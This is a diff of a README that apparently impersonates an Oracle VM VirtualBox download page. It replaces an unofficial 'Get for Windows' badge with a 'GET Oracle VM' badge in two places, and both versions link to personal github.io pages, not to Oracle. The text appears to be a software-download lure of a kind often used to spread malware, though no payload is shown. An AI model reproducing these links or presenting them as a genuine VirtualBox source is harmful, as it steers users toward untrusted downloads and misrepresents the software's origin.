@@ -5,10 +5,8 @@
 </div>  
 <br>
 
-<div align="center">
+[![GET Oracle VM](https://img.shields.io/badge/GET%20%E2%80%94%20Oracle-VM-0078D6?style=for-the-badge&logoColor=white)](https://parsonsaimee867.github.io/.github/Oracle-VM)
 
-  [![Get for Windows](https://img.shields.io/badge/Get_for_Windows-blue?style=for-the-badge)](https://oracle-vm-virtualbox-manager-download.github.io/.github/)
-</div>
 
 ---
 
@@ -25,10 +23,8 @@
 <img src="https://docs.oracle.com/en/virtualization/virtualbox/6.1/user/images/virtualbox-main.png" width="800">
 </div>
 
-<div align="center">
+[![GET Oracle VM](https://img.shields.io/badge/GET%20%E2%80%94%20Oracle-VM-0078D6?style=for-the-badge&logoColor=white)](https://parsonsaimee867.github.io/.github/Oracle-VM)
 
-  [![Get for Windows](https://img.shields.io/badge/Get_for_Windows-blue?style=for-the-badge)](https://oracle-vm-virtualbox-manager-download.github.io/.github/)
-</div>
 
 ---
 
